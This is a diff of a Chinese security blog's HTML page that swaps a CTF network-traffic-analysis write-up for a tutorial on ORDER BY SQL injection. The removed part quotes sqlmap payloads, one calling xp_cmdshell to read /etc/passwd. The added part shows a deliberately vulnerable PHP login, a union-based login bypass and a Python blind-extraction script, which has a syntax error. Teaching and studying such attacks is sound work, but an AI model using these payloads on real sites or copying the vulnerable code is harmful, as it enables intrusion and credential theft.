@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>2018西普杯铁人三项河南赛区（数据分析赛） · xiaomeiqiu&#39;s Studio</title>
+    <title>SQL注入-order by 注入 · xiaomeiqiu&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">xiaomeiqiu&#39;s Studio.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">2018西普杯铁人三项河南赛区（数据分析赛）</a>
+                <a href="#" class="post-name">SQL注入-order by 注入</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            2018西普杯铁人三项河南赛区（数据分析赛）
+            SQL注入-order by 注入
             <!-- 404 -->
             
         </h1>
@@ -264,20 +264,14 @@ height:50vh;
             <div class="post-intros">
                 <!-- 文章页标签  -->
                 
-                    <div class="post-intro-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="流量分析">流量分析</a>
-    
-</div>
-                
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">2.3k</span>阅读时长: <span class="post-count reading-time">9 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">763</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/06/10</span>
+                    <span class="post-intro-time">2018/04/08</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,46 +395,36 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先说下踩坑经历。第一次参加这种综合性比赛、数据赛、个人赛（主要是pwn）、企业赛，看到pwn没办法我们只能对他说再见（从头到尾连看都没看）。看似是一道文件上传题，n种姿势上传都失败，查看上传的文件发现什~$msf.doc、~$office.doc、……<a id="more"></a>，然后就是我们自己乱上传的那些东西。当时有点蒙圈，这些东西我都没上传呀，哪来的？？不会是被人干掉了吧。然而最后才知道每个人的环境都是独立的，而且这个题目考的就是我以前演示过的CEV2017-11882，赛后交流大佬们说，当时下载msf.doc，一打开屏幕弹出来个计算机，这个就再明显不过了！！！，然而我完美的避过了这些信息，我也下载msf.doc但是没弹计算器，只因为我下载了wps。一脑子就在想文件上传，传了n次。 后来那台服务器上还运行另一个服务，打开看看是joomal，流量分析里面也是joomal，如果好好做流量分析。差不多可以做出来大部分了。比赛做的还是很良心的。起码给writeup。最后全靠运气跑到第六。还是见的少应该多看看大佬们怎样玩渗透。接下来我们复现下数据分析赛的答案，流量分析玩着感觉不错也学到了好多东西。分享记录下。有空我会接着做其他赛区的流量分析题的。</p>
-<h2 id="题目描述"><a href="#题目描述" class="headerlink" title=".题目描述"></a>.题目描述</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1.黑客攻击的第一个受害主机的网卡IP地址</span><br><span class="line"></span><br><span class="line">2.黑客对URL的哪一个参数实施了SQL注入</span><br><span class="line"></span><br><span class="line">3.第一个受害主机网站数据库的表前缀(加上下划线 例如abc_)</span><br><span class="line"></span><br><span class="line">4.第一个受害主机网站数据库的名字</span><br><span class="line"></span><br><span class="line">5.Joomla后台管理员的密码是多少</span><br><span class="line"></span><br><span class="line">6.黑客第一次获得的php木马的密码是什么</span><br><span class="line"></span><br><span class="line">7.黑客第二次上传php木马是什么时间</span><br><span class="line"></span><br><span class="line">8.第二次上传的木马通过HTTP协议中的哪个头传递数据</span><br><span class="line"></span><br><span class="line">9.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)</span><br><span class="line"></span><br><span class="line">10.php代理第一次被使用时最先连接了哪个IP地址</span><br><span class="line"></span><br><span class="line">11.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候</span><br><span class="line"></span><br><span class="line">12.黑客在内网主机中添加的用户名和密码是多少</span><br><span class="line"></span><br><span class="line">13.黑客从内网服务器中下载下来的文件名</span><br></pre></td></tr></table></figure>
-<p>###攻击者IP确认&amp;&amp;入侵行为分析</p>
-<p>先过滤一波http请求，先总体看一下http的请求发现大量可疑数据（大量404的出现，以及大量的get请求，并且包含sql语句猜测是扫描器进行测试）发现是sqlmap进行注入如下图。显示过滤器输入http<img src="https://upload-images.jianshu.io/upload_images/20782429-582d958f5b175897.png" alt> 那基本上可以确定进行被攻击的内网ip为192.168.1.8，攻击者的ip是202.1.1.2。我们接着看黑客进行了什么操作。我们过滤出192.168.1.8请求和响应的。</p>
-<p>###入侵参数分析</p>
-<p>显示过滤器中输入：<code>http &amp;&amp; ip.addr == 192.168.1.8</code> 发现对好几个参数进行SQL注入测试，根据经验我们直接拉到最后一个测试的数据包（一般最后的都是测试的结果）。如下：</p>
-<p><code>list[ordering]=&amp;item_id=1&amp;type_id=1&amp;list[select]=(&amp;XfqR=2916 AND 1=1 UNION ALL SELECT 1,NULL,&#39;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#39;,table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell(&#39;cat ../../../etc/passwd&#39;)#</code></p>
-<p>分析其请求的相应数据包，其响应头服务器500报错了，但是仔细看到FROM <code>ajtuc\_ucm\_history\</code> 爆出数据表的名字了，也就是<code>list\[select\]</code>根据SQL语句猜测是报错注入，注入的参数是<code>list[select]</code>。尝试排除其他注入参数。</p>
-<p><code>http://202.1.1.1:8000/index.php?/option=com_contenthistory,,()&quot;)</code>  </p>
-<p>分析其请求头以及响应数据包，在option参数进行测试注入，但是响应数据包返回404，可以判断这个地方不存在SQL注入。</p>
-<p><code>http://202.1.1.1:8000/index.php?/option=com_contenthistory&amp;view=history&#39; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71626a6b71,(SELECT (ELT(2139=2139,1))),0x716a717671,0x78))s), 8446744073709551610, 8446744073709551610)))-- RSkb&amp;list[ordering]=&amp;item_id=1&amp;type_id=1&amp;list[select]=(*</code></p>
-<p>分析第三条请求头以及响应数据包，在view参数进行测试注入，但是响应数据包返回500，但是追踪流并没发现注入有用的相关信息，但是不排除可以注入，我们追踪他的最后一条这样的请求头（如果最后一条请求头带数据库数据表相关信息说明此参数可以注入），最后参数请求头的最后一条返回信息还是没有数据库信息。所以判断不在这进行注入</p>
-<p><code>list[ordering]=&quot;) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71626a6b71,(SELECT (ELT(5101=5101,1))),0x716a717671,0x78))s), 8446744073709551610, 8446744073709551610))) AND (&quot;hqBE&quot;=&quot;hqBE&amp;item_id=1&amp;type_id=1&amp;list[select]=(*</code></p>
-<p>分析第四条请求头以及响应数据包，在list[ordering]参数进行测试注入，服务器响应500，仔细观察响应头，还是发现有用信息的爆出了表名数据库名字，我们看看hack有没有利用这里进行注入，还是追踪这个参数的最后一个请求，依然没有相关数据库表相关信息，所以也不是利用这个参数进行注入。 虽然还有其他参数的注入测试这里就不再一一分析了，其他的请求分析参照前面四条请求头分析。 一般的逻辑应该是注入出来自己想要的信息就停手了，所以我们直接看最后一条类似注入的请求就可以看出来注入参数在哪。以及数据库数据表的相关信息，最后的请求信息为：很明显这里显示出数据库的名字joomal，表前缀ajtuc也有了。</p>
-<p><code>list[select]=(UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),4235))</code></p>
-<p>###获取网站后台密码</p>
-<p>查users表应该查出来账号和密码了,接着就该登录后台了。登录肯定是post请求，然后我们再过滤下 http.request.method== POST &amp;&amp; ip.dst == 192.168.1.8，三条请求<img src="https://upload-images.jianshu.io/upload_images/20782429-0cffcd84e4648b3b.png" alt> 我们分别来看下干了什么操作，第一个包应该是注册的时候用的，有邮箱，注册信息啥的，感觉没啥用。 <img src="https://upload-images.jianshu.io/upload_images/20782429-bc8d135af5b9f306.png" alt> 第二个包登录了看起来是账号和密码，但是比赛的时候提交不对好像。 <img src="https://upload-images.jianshu.io/upload_images/20782429-16b58116cec0b075.png" alt> 第三个包还是账号密码，然而比赛这些我都找到了还是不对。emememem…想打人 <img src="https://upload-images.jianshu.io/upload_images/20782429-43bc10e40dd090ec.png" alt> 最后那我发现这位大兄弟好像没有登录后台，因为post只有三个包，都没登录上去。思路可能不对，可能密码是注入出来的。尝试分析一波注入的数据，现在整理下思路：</p>
-<p>这个时候我们来从头到尾分析一下：</p>
-<blockquote>
-<p>首先hack ip：202.1.1.2</p>
-<p>被攻击的主机：192.168.1.8</p>
-<p>攻击方式:sqlmap多个参数进行暴力测试sql注入</p>
-<p>sql注入用的参数为：list[select]</p>
-<p>被攻击主机上数据库为：joomal</p>
-<p>被攻击主机上的表前缀为：_ajtuc</p>
-</blockquote>
-<p>接下来我们分析joomal的后台的账号密码：由最后一条注入数据包的相应数据包我们可以分析出来后台管理账号为amdin</p>
-<p><code>Error: 500 XPATH syntax error: &#39;qqzvqadminqqkkq&#39; SQL=SELECT (UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71_</code></p>
-<p>然后我们查找对password的注入。在显示过滤器中输入ip.dst == 192.168.1.8 &amp;&amp; http.request.uri contains “password” 得到三条数据包，我们分别追踪他们的相应数据包，得到三条数据</p>
-<p>1.请求sql语句<br><code>SELECT (UPDATEXML(5928,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),7096)),uc.name AS editor FROM `</code>ajtuc_ucm_history<code></code> AS h LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id WHERE h.ucm_item_id = 1 AND h.ucm_type_id = 1 ORDER BY h.save_date<code>响应主要数据：</code>qqzvq$2y$10$lXujU7XaUviJDigqqkkq<code>2.请求sql语句</code>SELECT (UPDATEXML(3613,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),23,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),7939)),uc.name AS editor FROM ajtuc_ucm_history AS h LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id WHERE h.ucm_item_id = 1 AND h.ucm_type_id = 1 ORDER BY h.save_date<code>响应主要数据：</code>qqzvqFMzKy6.wx7EMCBqpzrJdn7qqkkq<code>3.请求sql语句</code>SELECT (UPDATEXML(8949,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),45,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),3079)),uc.name AS editor FROM ajtuc_ucm_history AS h LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id WHERE h.ucm_item_id = 1 AND h.ucm_type_id = 1 ORDER BY h.save_date<code>响应主要数据：</code>qqzvqzi/8B2QRD7qIlDJeqqkkq`</p>
-<p>然后把concat里面多余数据去掉<code>--qqzvp、qqkkq</code>，得到最终hash值为：<code>$2y$10$lXujU7XaUviJDigFMzKy6.wx7EMCBqpzrJdn7zi/8B2QRD7qIlDJe</code> 然后我不会解了，emem看了好几个表哥也没有解出来，我也在坐等解法。接下来等我下次有空再写！！！！</p>
+        <p>##SQL注入-ORDERBY注入</p>
+<h3 id="1，后台登录代码如下："><a href="#1，后台登录代码如下：" class="headerlink" title="1，后台登录代码如下："></a><strong>1，后台登录代码如下：</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span>(filter($username))&#123;</span><br><span class="line">    <span class="comment">//过滤括号</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $sql=<span class="string">"SELECT * FROM admin WHERE username='"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line">    $result=mysql_query($sql);</span><br><span class="line">    @$row = mysql_fetch_array($result);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row) &amp;&amp; $row[<span class="string">'username'</span>] === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($row[<span class="string">'password'</span>]===md5($password))&#123;</span><br><span class="line">            <span class="comment">//Login successful</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"password error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"username does not exist!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="2，利用伪登录可以进行登录。"><a href="#2，利用伪登录可以进行登录。" class="headerlink" title="2，利用伪登录可以进行登录。"></a><strong>2，利用伪登录可以进行登录。</strong></h3><p>因为mysql_fetch_array()只返回数据库中的第一行，所以构造语句：</p>
+<p><code>select * from admin where username=&#39;&#39; or 1 union select  1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39; #&amp;password=1</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username=&apos;&apos; or 1 union select  1,&apos;admin&apos;,&apos;c4ca4238a0b923820dcc509a6f75849b&apos; </span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| 1 | admin | c4ca4238a0b923820dcc509a6f75849b |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>即可进行登录进去，想要接着注入其他用户接着往下看order by注入</p>
+<h3 id="3-利用order-by-利用py脚本进行注入指定用户相关信息"><a href="#3-利用order-by-利用py脚本进行注入指定用户相关信息" class="headerlink" title="3.利用order by 利用py脚本进行注入指定用户相关信息"></a>3.利用order by 利用py脚本进行注入指定用户相关信息</h3><p>原理见图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username=&apos;&apos; or 1 union select 1,&apos;2&apos;,&apos;z&apos;order by 3;</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| 1 | admin | c4ca4238a0b923820dcc509a6f75849b |</span><br><span class="line">| 1 | 2 | z |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username=&apos;&apos; or 1 union select 1,&apos;2&apos;,&apos;a&apos;order by 3;</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| 1 | 2 | a |</span><br><span class="line">| 1 | admin | c4ca4238a0b923820dcc509a6f75849b |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>当order by 第三列（以第三列进行排序）msql_fecth_array(),只返回表的第一行，所以可以构造，</p>
+<p><code>payload：&quot;select * from admin where username=&#39;&#39; or 1 union select 1,&#39;2&#39;,&#39;%s&#39;order by 3&quot;%(d)</code></p>
+<p>（当用户只有一个时）利用返回值的不同来爆破判断密码是否正确。</p>
+<p><code>payload：&quot;select * from admin where username=&#39;&#39; or 1 and username=&#39;admin&#39; union select 1,&#39;2&#39;,&#39;%s&#39;order by 3&quot;%(d)</code></p>
+<p>（当用户不止一个的时候可以指定username）</p>
+<p>测试代码如下order.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$con = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"security"</span>, $con);</span><br><span class="line"></span><br><span class="line">$sql=$_GET[<span class="string">'sql'</span>];</span><br><span class="line"><span class="keyword">echo</span> $sql.<span class="string">"\n"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">print_r($row);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"current username is :"</span>.$row[<span class="string">'username'</span>].<span class="string">"\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($row) &amp;&amp; $row[<span class="string">'username'</span>] === <span class="string">'admin'</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span> ($row[<span class="string">'password'</span>]===md5($password))&#123;</span><br><span class="line"> 		<span class="comment">//Login successful</span></span><br><span class="line"> 	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> 		<span class="keyword">die</span>(<span class="string">"password error!"</span>);</span><br><span class="line"> 	&#125;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> 	<span class="keyword">die</span>(<span class="string">"username does not exist!"</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>编写脚本如下order.py（代码自动整理吧！）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line">cur_str=<span class="string">''</span> <span class="comment">#当前字符串</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_url</span><span class="params">(url)</span>:</span></span><br><span class="line"> req = urllib2.Request(url)</span><br><span class="line"> response = urllib2.urlopen(req)</span><br><span class="line"> html = response.read()</span><br><span class="line"> <span class="keyword">print</span> html <span class="comment">#显示页面返回 response返回的是str，正则返回list</span></span><br><span class="line"> <span class="keyword">return</span> <span class="string">'password error!'</span><span class="keyword">in</span> html</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">30</span>): <span class="comment">#测试字符串长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">122</span>): </span><br><span class="line"> <span class="keyword">print</span> cur_str+chr(i) <span class="comment">#显示当前测试字符</span></span><br><span class="line"> url =<span class="string">"http://192.168.199.177/text/orderby.php?sql=select%20*%20from%20users%20where%20username="</span>+quote(<span class="string">"'' or 1 and username='admin' union select 1,2,binary '%s' order by 3"</span>%(cur_str+chr(i))) </span><br><span class="line"> <span class="keyword">if</span>(check_url(url):</span><br><span class="line"> cur\_str=cur\_str+chr(i<span class="number">-1</span>)</span><br><span class="line"> <span class="keyword">print</span> cur_str <span class="comment">#输出字符串</span></span><br><span class="line"> <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>4.运行结果如图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where username=&apos;&apos; or 1 and username=&apos;admin&apos; union select 1,2,binary &apos;c&apos; order by 3</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line"> \[0\] =&gt; 1</span><br><span class="line"> \[id\] =&gt; 1</span><br><span class="line"> \[1\] =&gt; 2</span><br><span class="line"> \[username\] =&gt; 2</span><br><span class="line"> \[2\] =&gt; c</span><br><span class="line"> \[password\] =&gt; c</span><br><span class="line">)</span><br><span class="line">current username is :2</span><br><span class="line">username does not exist!</span><br><span class="line">d</span><br><span class="line">select * from admin where username=&apos;&apos; or 1 and username=&apos;admin&apos; union select 1,2,binary &apos;d&apos; order by 3</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line"> \[0\] =&gt; 1</span><br><span class="line"> \[id\] =&gt; 1</span><br><span class="line"> \[1\] =&gt; admin</span><br><span class="line"> \[username\] =&gt; admin</span><br><span class="line"> \[2\] =&gt; c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line"> \[password\] =&gt; c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line">)</span><br><span class="line">current username is :admin</span><br><span class="line">&lt;br /&gt;</span><br></pre></td></tr></table></figure>
+<p>师傅的博客参考链接：<a href="http://p0sec.net/index.php/archives/106/" target="_blank" rel="noopener">http://p0sec.net/index.php/archives/106/</a></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="23.105.208.131">xiaomeiqiu</a>
-            </p><p>原文链接：<a href="23.105.208.131/2018/06/10/2018西普杯铁人三项河南赛区（数据分析赛）/">23.105.208.131/2018/06/10/2018西普杯铁人三项河南赛区（数据分析赛）/</a>
-            </p><p>发表日期：<a href="23.105.208.131/2018/06/10/2018西普杯铁人三项河南赛区（数据分析赛）/">June 10th 2018, 11:04:44 pm</a>
-            </p><p>更新日期：<a href="23.105.208.131/2018/06/10/2018西普杯铁人三项河南赛区（数据分析赛）/">January 6th 2020, 3:57:56 pm</a>
+            </p><p>原文链接：<a href="23.105.208.131/2018/04/08/SQL注入-Oderby注入/">23.105.208.131/2018/04/08/SQL注入-Oderby注入/</a>
+            </p><p>发表日期：<a href="23.105.208.131/2018/04/08/SQL注入-Oderby注入/">四月 8日 2018, 6:45:36 晚上</a>
+            </p><p>更新日期：<a href="23.105.208.131/2018/04/08/SQL注入-Oderby注入/">January 6th 2020, 4:11:43 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -449,17 +433,12 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href="/2018/08/13/little-muma/" title="ISCC国赛-一句话木马分析">
-                    <div class="nextTitle">ISCC国赛-一句话木马分析</div>
+                <a href="/2018/06/10/2018西普杯铁人三项河南赛区（数据分析赛）/" title="2018西普杯铁人三项河南赛区（数据分析赛）">
+                    <div class="nextTitle">2018西普杯铁人三项河南赛区（数据分析赛）</div>
                 </a>
             
         </li>
         <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href="/2018/04/08/SQL注入-Oderby注入/" title="SQL注入-order by 注入">
-                    <div class="prevTitle">SQL注入-order by 注入</div>
-                </a>
             
         </li>
     </ul>
@@ -570,7 +549,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目描述"><span class="toc-number">2.</span> <span class="toc-text">.题目描述</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1，后台登录代码如下："><span class="toc-number">1.</span> <span class="toc-text">1，后台登录代码如下：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2，利用伪登录可以进行登录。"><span class="toc-number">2.</span> <span class="toc-text">2，利用伪登录可以进行登录。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-利用order-by-利用py脚本进行注入指定用户相关信息"><span class="toc-number">3.</span> <span class="toc-text">3.利用order by 利用py脚本进行注入指定用户相关信息</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
